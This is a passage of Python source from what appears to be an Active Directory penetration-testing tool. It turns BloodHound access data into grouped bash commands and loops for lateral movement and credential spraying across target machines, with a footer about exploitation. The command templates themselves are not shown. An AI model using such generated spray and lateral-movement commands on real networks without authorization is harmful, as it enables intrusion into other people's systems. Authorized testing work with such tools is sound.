    console_lines.append(f"    Users with access:    {c.BOLD}{unique_users}{c.RESET}")
    console_lines.append(f"    Target machines:      {c.BOLD}{unique_computers}{c.RESET}")
    console_lines.append(f"    Access types found:   {c.BOLD}{', '.join(sorted(access_types_found))}{c.RESET}")

    markdown_lines.append("## Summary")
    markdown_lines.append("")
    markdown_lines.append(f"- **Users with access:** {unique_users}")
    markdown_lines.append(f"- **Target machines:** {unique_computers}")
    markdown_lines.append(f"- **Access types:** {', '.join(sorted(access_types_found))}")
    markdown_lines.append("")

    if not access_data:
        console_lines.append("")
        console_lines.append(f"  {c.YELLOW}No user-to-machine access relationships found.{c.RESET}")
        markdown_lines.append("*No user-to-machine access relationships found.*")
        return "\n".join(console_lines), "\n".join(markdown_lines)

    # =========================================================================
    # GROUP BY ACCESS TYPE
    # =========================================================================
    for access_type in ["AdminTo", "CanRDP", "CanPSRemote", "ExecuteDCOM", "ReadLAPSPassword"]:
        if access_type not in access_types_found:
            continue

        protocol_info = ACCESS_TYPE_PROTOCOLS.get(access_type, {})
        access_name = protocol_info.get("name", access_type)
        protocols = protocol_info.get("protocols", [])

        # Build user_targets for this access type
        user_targets = {}
        for user, access_dict in user_access.items():
            if access_type in access_dict:
                user_targets[_extract_username(user)] = access_dict[access_type]

        if not user_targets:
            continue

        groups = _group_by_common_targets(user_targets, access_type)

        console_lines.append("")
        console_lines.append(f"  {c.CYAN}{c.BOLD}{'='*74}{c.RESET}")
        console_lines.append(f"  {c.BOLD}{access_name.upper()} ({access_type}){c.RESET}")
        console_lines.append(f"  {c.DIM}{len(user_targets)} users, {len(groups)} unique target groups{c.RESET}")
        console_lines.append(f"  {c.CYAN}{'='*74}{c.RESET}")

        markdown_lines.append(f"## {access_name} ({access_type})")
        markdown_lines.append("")
        markdown_lines.append(f"{len(user_targets)} users, {len(groups)} unique target groups")
        markdown_lines.append("")

        # =====================================================================
        # EACH GROUP
        # =====================================================================
        for group_idx, group in enumerate(groups, 1):
            users = group["users"]
            targets = group["targets"]
            target_ips = group["target_ips"]

            # Get IPs (prefer resolved IPs, fallback to hostname)
            ips_or_hosts = []
            for t in targets:
                ip = target_ips.get(t)
                if ip:
                    ips_or_hosts.append(ip)
                else:
                    # Use hostname without domain if no IP
                    hostname = t.split(".")[0] if "." in t else t
                    ips_or_hosts.append(hostname)

            console_lines.append("")
            console_lines.append(f"  {c.YELLOW}{c.BOLD}Group {group_idx}: {len(users)} user(s) → {len(targets)} target(s){c.RESET}")
            console_lines.append(f"  {c.DIM}Users: {', '.join(users)}{c.RESET}")

            markdown_lines.append(f"### Group {group_idx}: {len(users)} user(s) → {len(targets)} target(s)")
            markdown_lines.append("")
            markdown_lines.append(f"**Users:** `{', '.join(users)}`")
            markdown_lines.append("")

            # Show targets with IPs
            console_lines.append(f"  {c.DIM}Targets:{c.RESET}")
            markdown_lines.append("**Targets:**")
            markdown_lines.append("")
            for t in targets:
                ip = target_ips.get(t)
                if ip:
                    console_lines.append(f"    - {t} ({ip})")
                    markdown_lines.append(f"- `{t}` ({ip})")
                else:
                    console_lines.append(f"    - {t}")
                    markdown_lines.append(f"- `{t}`")
            markdown_lines.append("")

            # =================================================================
            # FILE-BASED COMMANDS
            # =================================================================
            console_lines.append("")
            console_lines.append(f"  {c.BOLD}File-based commands:{c.RESET}")
            markdown_lines.append("#### File-based commands")
            markdown_lines.append("")

            users_str = "\\n".join(users)
            targets_str = "\\n".join(ips_or_hosts)

            console_lines.append(f"    {c.GREEN}# Create user and target files{c.RESET}")
            console_lines.append(f"    {c.GREEN}echo -e \"{users_str}\" > users_g{group_idx}.txt{c.RESET}")
            console_lines.append(f"    {c.GREEN}echo -e \"{targets_str}\" > targets_g{group_idx}.txt{c.RESET}")

            markdown_lines.append("```bash")
            markdown_lines.append("# Create user and target files")
            markdown_lines.append(f'echo -e "{users_str}" > users_g{group_idx}.txt')
            markdown_lines.append(f'echo -e "{targets_str}" > targets_g{group_idx}.txt')

            # Show first protocol command with file-based input
            if protocols:
                proto = protocols[0]
                cmd = proto["cmd"]
                # Replace file-based placeholders
                cmd = cmd.replace("{targets}", f"targets_g{group_idx}.txt")
                cmd = cmd.replace("{users}", f"users_g{group_idx}.txt")
                # Also replace single placeholders for commands that don't support file input
                cmd = cmd.replace("{target}", f"targets_g{group_idx}.txt")
                cmd = cmd.replace("{user}", f"users_g{group_idx}.txt")
                cmd = cmd.replace("{domain}", domain.split(".")[0] if domain else "<DOMAIN>")
                console_lines.append(f"    {c.GREEN}{cmd}{c.RESET}")
                markdown_lines.append(cmd)

            markdown_lines.append("```")
            markdown_lines.append("")

            # =================================================================
            # INLINE BASH LOOP
            # =================================================================
            console_lines.append("")
            console_lines.append(f"  {c.BOLD}Inline bash loop:{c.RESET}")
            markdown_lines.append("#### Inline bash loop")
            markdown_lines.append("")

            users_inline = " ".join(users)
            targets_inline = " ".join(ips_or_hosts)

            if protocols:
                proto = protocols[0]
                single_cmd = proto.get("single", proto["cmd"])
                single_cmd = single_cmd.replace("{domain}", domain.split(".")[0] if domain else "<DOMAIN>")

                loop = f"for user in {users_inline}; do\n  for target in {targets_inline}; do\n    {single_cmd.replace('{user}', '$user').replace('{target}', '$target')}\n  done\ndone"

                console_lines.append(f"    {c.GREEN}for user in {users_inline}; do{c.RESET}")
                console_lines.append(f"    {c.GREEN}  for target in {targets_inline}; do{c.RESET}")
                console_lines.append(f"    {c.GREEN}    {single_cmd.replace('{user}', '$user').replace('{target}', '$target')}{c.RESET}")
                console_lines.append(f"    {c.GREEN}  done{c.RESET}")
                console_lines.append(f"    {c.GREEN}done{c.RESET}")

                markdown_lines.append("```bash")
                markdown_lines.append(f"for user in {users_inline}; do")
                markdown_lines.append(f"  for target in {targets_inline}; do")
                markdown_lines.append(f"    {single_cmd.replace('{user}', '$user').replace('{target}', '$target')}")
                markdown_lines.append("  done")
                markdown_lines.append("done")
                markdown_lines.append("```")
                markdown_lines.append("")

            # =================================================================
            # ALL PROTOCOL OPTIONS
            # =================================================================
            if len(protocols) > 1:
                console_lines.append("")
                console_lines.append(f"  {c.DIM}Alternative protocols:{c.RESET}")
                markdown_lines.append("**Alternative protocols:**")
                markdown_lines.append("")

                for proto in protocols[1:]:
                    single_cmd = proto.get("single", proto["cmd"])
                    single_cmd = single_cmd.replace("{domain}", domain.split(".")[0] if domain else "<DOMAIN>")
                    single_cmd = single_cmd.replace("{user}", users[0])
                    single_cmd = single_cmd.replace("{target}", ips_or_hosts[0] if ips_or_hosts else "<TARGET>")

                    console_lines.append(f"    {c.DIM}# {proto['name']}{c.RESET}")
                    console_lines.append(f"    {c.GREEN}{single_cmd}{c.RESET}")

                    markdown_lines.append(f"```bash")
                    markdown_lines.append(f"# {proto['name']}")
                    markdown_lines.append(single_cmd)
                    markdown_lines.append("```")
                    markdown_lines.append("")

    # =========================================================================
    # MONOLITHIC SPRAY SECTION
    # =========================================================================
    mono_console, mono_markdown = _generate_monolithic_spray(access_data, domain, use_colors)
    console_lines.extend(mono_console)
    markdown_lines.extend(mono_markdown)

    # =========================================================================
    # FOOTER
    # =========================================================================
    console_lines.append("")
    console_lines.append(f"{c.CYAN}{'='*78}{c.RESET}")
    console_lines.append(f"  {c.YELLOW}{c.BOLD}NOTE:{c.RESET} Replace '<PASSWORD>' with actual credentials.")
    console_lines.append(f"  {c.DIM}Commands are based on BloodHound data - verify access before exploitation.{c.RESET}")
    console_lines.append(f"{c.CYAN}{'='*78}{c.RESET}")
    console_lines.append("")

    markdown_lines.append("---")
    markdown_lines.append("")
    markdown_lines.append("> **NOTE:** Replace `<PASSWORD>` with actual credentials.")
    markdown_lines.append("> Commands are based on BloodHound data - verify access before exploitation.")
    markdown_lines.append("")

    return "\n".join(console_lines), "\n".join(markdown_lines)
